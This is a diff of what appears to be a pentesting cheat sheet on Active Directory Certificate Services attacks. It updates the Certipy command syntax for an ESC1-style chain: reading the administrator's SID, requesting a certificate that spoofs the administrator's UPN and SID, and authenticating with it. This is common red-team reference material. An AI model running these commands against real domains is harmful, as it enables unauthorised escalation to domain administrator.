@@ -4,17 +4,16 @@ Highly Recommended Reference for ADCS attacks https://github.com/ly4k/Certipy/wi
 #### Exploitation
 - Linux
     ```bash
-    certipy-ad account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read
+    # Get the administrator SID
+    certipy account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read
     ```
     ```bash
-    certipy-ad req \
-        -u 'attacker@corp.local' -p 'Passw0rd!' \
-        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
+    certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
         -ca 'CORP-CA' -template 'VulnTemplate' \
         -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
     ```
     ```bash 
-    certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
+    certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
     ```
 
 ### ESC2
